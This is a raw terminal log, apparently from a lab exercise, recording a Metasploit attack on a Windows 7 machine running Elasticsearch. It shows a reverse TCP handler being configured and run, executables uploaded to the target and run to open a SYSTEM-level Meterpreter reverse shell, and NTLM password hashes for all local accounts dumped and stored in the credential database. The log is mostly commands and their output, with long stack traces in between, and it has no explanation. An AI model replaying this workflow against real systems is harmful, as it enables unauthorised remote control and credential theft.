+[0m[4mmeterpreter[0m > Script started on 2023-05-04 18:52:27-04:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="34"]
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[4ms[39m[4ml[24m[39m [39m [4ml[4me[24m[?1l>[?2004l
+msfconsle: command not found
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153msfconsle[39m[8D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[24m[36mm[24m[36ms[24m[36mf[24m[36mc[24m[36mo[24m[36mn[36ms[36mo[36ml[36me[39m[1m [0m[0m [?1l>[?2004l
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|                                                  
+[0m[36m[0m[37m
+Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
+EFLAGS: 00010046
+eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
+esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
+ds: 0018   es: 0018  ss: 0018
+Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
+
+[1m
+Stack: 90909090990909090990909090
+       90909090990909090990909090
+       90909090.90909090.90909090
+       90909090.90909090.90909090
+       90909090.90909090.09090900
+       90909090.90909090.09090900
+       ..........................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ccccccccc.................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       .................ccccccccc
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ..........................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffff..................
+       ffffffff..................
+[0m
+
+[33mCode: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00[0m
+Aiee, Killing Interrupt handler
+[31mKernel panic: Attempted to kill the idle task!
+In swapper task - not syncing[0m
+[0m
+
+       =[ [33mmetasploit v6.3.4-dev[0m                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use the [32mresource[0m command to run 
+commands from a file
+Metasploit Documentation: https://docs.metasploit.com/
+
+[?1034h[4mmsf6[0m [0m> use multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> options
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set LhoST 192.168.56.103
+[0mLhoST => 192.168.56.103
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set payload windows/meterpreter/reverse_e[Ktcp
+[0mpayload => windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:4444 
+dir
+[0mListing: C:\Program Files\elasticsearch-1.1.1
+=============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100776/rwxrwxrw-  0        fil   2016-12-01 00:35:24 -0500  C
+100776/rwxrwxrw-  1033216  fil   2016-12-01 00:35:12 -0500  Fileselasticsearch-1.1.1rshell.exe
+100776/rwxrwxrw-  11358    fil   2014-02-12 09:35:54 -0500  LICENSE.txt
+100776/rwxrwxrw-  150      fil   2014-03-25 16:38:22 -0400  NOTICE.txt
+100776/rwxrwxrw-  8093     fil   2014-03-25 16:38:22 -0400  README.textile
+040776/rwxrwxrw-  4096     dir   2014-04-16 15:28:54 -0400  bin
+040776/rwxrwxrw-  0        dir   2014-04-16 15:28:54 -0400  config
+040776/rwxrwxrw-  0        dir   2016-11-29 15:47:56 -0500  data
+040776/rwxrwxrw-  8192     dir   2014-04-16 15:28:54 -0400  lib
+040776/rwxrwxrw-  16384    dir   2023-05-04 18:46:57 -0400  logs
+100776/rwxrwxrw-  1033216  fil   2016-12-01 00:35:37 -0500  rshell.exe
+
+[4mmeterpreter[0m > upload vakul.exe
+[0m[1m[34m[*][0m Uploading  : /home/kali/Desktop/final/vakul.exe -> vakul.exe
+[1m[34m[*][0m Completed  : /home/kali/Desktop/final/vakul.exe -> vakul.exe
+[4mmeterpreter[0m > shell
+[0mProcess 2 created.
+Channel 3 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files\elasticsearch-1.1.1>sh  valu  kul.exe
+vakul.exe
+^C
+Terminate channel 3? [y/N]  y
+[4mmeterpreter[0m > ^C[1m[31m[-][0m Exploit failed [user-interrupt]: Interrupt 
+[1m[31m[-][0m run: Interrupted
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> set LpoRT 5555
+[0mLpoRT => 5555
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:5555 
+dir
+[0mListing: C:\Program Files\elasticsearch-1.1.1
+=============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100776/rwxrwxrw-  0        fil   2016-12-01 00:35:24 -0500  C
+100776/rwxrwxrw-  1033216  fil   2016-12-01 00:35:12 -0500  Fileselasticsearch-1.1.1rshell.exe
+100776/rwxrwxrw-  11358    fil   2014-02-12 09:35:54 -0500  LICENSE.txt
+100776/rwxrwxrw-  150      fil   2014-03-25 16:38:22 -0400  NOTICE.txt
+100776/rwxrwxrw-  8093     fil   2014-03-25 16:38:22 -0400  README.textile
+040776/rwxrwxrw-  4096     dir   2014-04-16 15:28:54 -0400  bin
+040776/rwxrwxrw-  0        dir   2014-04-16 15:28:54 -0400  config
+040776/rwxrwxrw-  0        dir   2016-11-29 15:47:56 -0500  data
+040776/rwxrwxrw-  8192     dir   2014-04-16 15:28:54 -0400  lib
+040776/rwxrwxrw-  16384    dir   2023-05-04 18:46:57 -0400  logs
+100776/rwxrwxrw-  1033216  fil   2016-12-01 00:35:37 -0500  rshell.exe
+100776/rwxrwxrw-  0        fil   2023-05-04 18:54:26 -0400  vakul.exe
+
+[4mmeterpreter[0m > shell
+[0mProcess 3 created.
+Channel 4 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files\elasticsearch-1.1.1>vakul.exe
+vakul.exe
+	^Z
+Background channel 4? [y/N]  y
+[4mmeterpreter[0m > upload ~/v[K[K[Khome==[K[K[K[K[K[K/home/kali/f[K[K[K[K[K[K[K[K[K[K[K[Kexam.exe [K
+[0m[1m[34m[*][0m Uploading  : /home/kali/Desktop/final/exam.exe -> exam.exe
+/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998: warning: Exception in finalizer #<Proc:0x00007f41bba47be0 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339>
+/usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `synchronize': [1mcan't be called from trap context ([1;4mThreadError[m[1m)[m
+	from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `log'
+	from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:172:in `elog'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:343:in `rescue in block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:340:in `block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/channel.rb:255:in `_write'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/channel.rb:223:in `write'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/io.rb:34:in `syswrite'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb:322:in `upload_file'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:1080:in `block in cmd_upload'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:1064:in `each'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:1064:in `cmd_upload'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
+	from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
+	from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
+	from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:192:in `cmd_exploit'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	from /usr/bin/msfconsole:23:in `<main>'
+/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': [1mcan't be called from trap context ([1;4mThreadError[m[1m)[m
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:368:in `close'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:341:in `block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/channel.rb:255:in `_write'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/channel.rb:223:in `write'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/io.rb:34:in `syswrite'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb:322:in `upload_file'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:1080:in `block in cmd_upload'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:1064:in `each'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:1064:in `cmd_upload'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
+	from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
+	from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
+	from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:192:in `cmd_exploit'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+	from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+	from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+	from /usr/bin/msfconsole:23:in `<main>'
+[1m[34m[*][0m Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/kali/Desktop/final/exam.exe -> exam.exe
+[1m[34m[*][0m Completed  : /home/kali/Desktop/final/exam.exe -> exam.exe
+[4mmeterpreter[0m > run
+[0mUsage: run <script> [arguments]
+
+Executes a ruby script or Metasploit Post module in the context of the
+meterpreter session.  Post modules can take arguments in var=val format.
+Example: run post/foo/bar BAZ=abcd
+
+[4mmeterpreter[0m > shell'[K
+[0m/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:739: warning: Exception in finalizer #<Proc:0x00007f41bb501fa0 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339>
+/usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `synchronize': [1mcan't be called from trap context ([1;4mThreadError[m[1m)[m
+	from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `log'
+	from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:172:in `elog'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:343:in `rescue in block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:340:in `block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:739:in `[]'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:739:in `from_r'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:987:in `from_r'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:569:in `decrypt_inbound_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:328:in `block in monitor_socket'
+	from /usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn'
+	from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/logging-2.3.1/lib/logging/diagnostic_context.rb:474:in `block in create_with_logging_context'
+/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': [1mcan't be called from trap context ([1;4mThreadError[m[1m)[m
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:368:in `close'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:341:in `block in finalize'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:739:in `[]'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:739:in `from_r'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:987:in `from_r'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:569:in `decrypt_inbound_packet'
+	from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:328:in `block in monitor_socket'
+	from /usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn'
+	from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'
+	from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/logging-2.3.1/lib/logging/diagnostic_context.rb:474:in `block in create_with_logging_context'
+Process 4 created.
+Channel 6 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files\elasticsearch-1.1.1>exam.exe
+exam.exe
+
+C:\Program Files\elasticsearch-1.1.1>[1m[34m[*][0m Sending stage (175686 bytes) to 192.168.56.198
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.56.103:5555 -> 192.168.56.198:49540) at 2023-05-04 19:00:18 -0400
+
+[0m[4mmeterpreter[0m > hashdump
+[0mAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+anakin_skywalker:1008:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
+artoo_detoo:1004:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
+ben_kenobi:1006:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
+boba_fett:1011:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
+chewbacca:1014:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
+c_three_pio:1005:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
+darth_vader:1007:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
+greedo:1013:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+han_solo:1003:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
+IEUser:1000:aad3b435b51404eeaad3b435b51404ee:d74b7de08bd26576df504ffc0e28fc12:::
+jabba_hutt:1012:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
+jarjar_binks:1009:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
+kylo_ren:1015:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
+lando_calrissian:1010:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
+leah_organa:1001:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
+luke_skywalker:1002:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
+SkipKiddie:1016:aad3b435b51404eeaad3b435b51404ee:179a5f848f16414d03aea72d90eac696:::
+[4mmeterpreter[0m > 
+Background session 1? [y/N]  
+[0m[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> use post [Kwindows [K[K[K[K[K[K[K[K/windows/gather/hashdump [K
+[0m[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> options
+[0m
+Module options (post/windows/gather/hashdump):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                    Connection
+  --  ----  ----                     -----------                    ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ IE8WIN7  192.168.56.103:5555 -> 192.168.56.198:49540 (192.168.56.198)
+
+[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> set session 1
+[0msession => 1
+[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> run
+[0m
+[1m[34m[*][0m Obtaining the boot key...
+[1m[34m[*][0m Calculating the hboot key using SYSKEY e1cdb8a83a0d9739f9c5b08521ffd147...
+[1m[34m[*][0m Obtaining the user list and keys...
+[1m[34m[*][0m Decrypting user keys...
+[1m[34m[*][0m Dumping password hints...
+
+No users with password hints on this system
+
+[1m[34m[*][0m Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+IEUser:1000:aad3b435b51404eeaad3b435b51404ee:d74b7de08bd26576df504ffc0e28fc12:::
+leah_organa:1001:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
+luke_skywalker:1002:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
+han_solo:1003:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
+artoo_detoo:1004:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
+c_three_pio:1005:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
+ben_kenobi:1006:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
+darth_vader:1007:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
+anakin_skywalker:1008:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
+jarjar_binks:1009:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
+lando_calrissian:1010:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
+boba_fett:1011:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
+jabba_hutt:1012:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
+greedo:1013:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
+chewbacca:1014:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
+kylo_ren:1015:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
+SkipKiddie:1016:aad3b435b51404eeaad3b435b51404ee:179a5f848f16414d03aea72d90eac696:::
+
+
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mwindows/gather/hashdump[0m) [0m> creds
+[0mCredentials
+===========
+
+host            origin          service        public            private                                                            realm  private_type  JtR Format
+----            ------          -------        ------            -------                                                            -----  ------------  ----------
+192.168.56.198  192.168.56.198  445/tcp (smb)  anakin_skywalker  aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  artoo_detoo       aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  ben_kenobi        aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  boba_fett         aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  chewbacca         aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  c_three_pio       aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  darth_vader       aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  greedo            aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db         NTLM hash     nt,lm
+192.168.56.198  192.168.56.198  445/tcp (smb)  han_solo          aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951         NTLM hash     nt,lm
